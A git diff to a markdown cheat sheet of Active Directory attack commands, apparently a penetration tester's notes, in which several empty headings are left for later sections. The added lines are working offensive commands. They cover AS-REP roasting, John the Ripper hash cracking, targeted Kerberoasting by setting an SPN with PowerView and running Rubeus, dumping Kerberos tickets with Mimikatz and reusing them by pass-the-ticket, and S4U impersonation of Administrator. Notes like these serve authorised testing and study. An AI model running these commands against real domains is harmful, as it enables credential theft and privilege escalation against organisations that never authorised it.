@@ -62,7 +62,8 @@ C:> python.exe .\tgsrepcrack.py .\<wordlist>.txt .\<exported_file_from_mimikatz>
 ##### Enumerating accounts with Kerberos Preauth disabled
 ```powershell
 # PowerView
-C:> Get-DomainUser -PreauthNotRequired -Verbose             
+C:> Get-DomainUser -PreauthNotRequired -Verbose    
+
 # AD Module
 C:> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
 ```
@@ -71,10 +72,16 @@ C:> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequ
 C:> Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
 C:> Get-DomainUser -PreauthNotRequired -Verbose    # Check
 ``` 
-##### ASREPRoast : Request Encrypted AS-REP for Offline Brute Force
+##### ASREPRoast 
 ```powershell
+# Request Encrypted AS-REP for Offline Brute Force
+C:> Get-ASREPHash -UserName <user> -Verbose
 
+# Enumerate Users with KErberos preauth disabled
+C:> Invoke-ASREPRoast -Verbose
 
+# Crack using JTR
+C:> john.exe --wordlist=C:\10k-worst-pass.txt C:\asrephashes.txt
 ```
 ### Targeted Kerberoasting Set SPN
 ---
@@ -84,22 +91,32 @@ With rights over a user, we can set a SPN to it, and then go for a AS-REPs attac
 C:> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
 
 # Check if user already has a SPN
-C:> Get-DomainUser -Identity supportuser | select serviceprincipalname
+C:> Get-DomainUser -Identity <user> | select serviceprincipalname
 
 # Set SPN for the user
-C:> Set-DomainObject -Identity support1user | Set @{serviceprincipalname='ops/whatever1'}
+C:> Set-DomainObject -Identity <user> | Set @{serviceprincipalname='ops/whatever1'}
+
+# Kerberoast the user
+C:> Rubeus.exe kerberoast /outfile:targetedhashes.txt
+C:> john.exe /wordlist=C:\wordlist.txt C:\targetedhashes.txt
 ```
 
 ### Kerberos Delegation
 ---
 
-##### Uncostrained Delegation
+#### Uncostrained Delegation
 ```powershell
 # Find Server with Unconstraided Delegation Enabled
 C:> . C:\AD\Tools\PowerView.ps1
 C:> Get-DomainComputer -Unconstrained | select -ExpandProperty name
 <host1>
 <host_n>
+
+# Compromise the server and wait uuser to connect to server and then dump tokens on .kirbi files
+C:> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+
+# Reuse the exported ticket with PTT
+C:> Invoke-Mimikatz -Command '"kerberos::ptt C:<ticket_file_name>.kirbi"'
 ```
 - Requisite for elevation using this technique, is to compromise a user with Admin Rights on the host
 
@@ -142,6 +159,17 @@ C:> Get-DomainComputer -TrustedToAuth
 # Impersonate User Administrator using the host account
 C:> Rubeus.exe s4u /user:<host_account>$ /aes256:<host_aes_hash> /impersonateuser:Administrator /msdsspn:time/<host_Fqdn> /altservice:ldap /ptt
 ```
+##### Resource Based RBCD
 
 
+### DNSAdmins
 
+### Across Trusts
+
+##### Child to Parent
+
+##### Across Forest
+
+##### Across Domain Trusts AD CS
+
+### MS SQL Servers
